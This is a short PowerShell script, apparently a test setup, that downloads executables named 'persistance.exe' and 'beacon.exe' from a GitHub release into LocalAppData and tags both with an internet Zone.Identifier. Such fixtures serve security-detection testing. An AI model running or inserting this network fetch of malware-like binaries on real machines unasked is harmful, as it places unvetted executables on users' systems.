$localAppDataPath = [Environment]::GetFolderPath('LocalApplicationData')
$persistancePath = "$localAppDataPath\persistance.exe"
$beaconPath = "$localAppDataPath\beacon.exe"

if (-Not (Test-Path $persistancePath)) {
	Write-Output "Downloading $persistancePath"
	(New-Object System.Net.WebClient).DownloadFile("https://github.com/pkemkes/graph-test-sample-dev/releases/latest/download/persistance.exe", $persistancePath)
}
if (-Not (Test-Path $beaconPath)) {
	Write-Output "Downloading $beaconPath"
	(New-Object System.Net.WebClient).DownloadFile("https://github.com/pkemkes/graph-test-sample-dev/releases/latest/download/beacon.exe", $beaconPath)
}

Set-Content -Path $persistancePath -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'
Set-Content -Path $beaconPath -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'
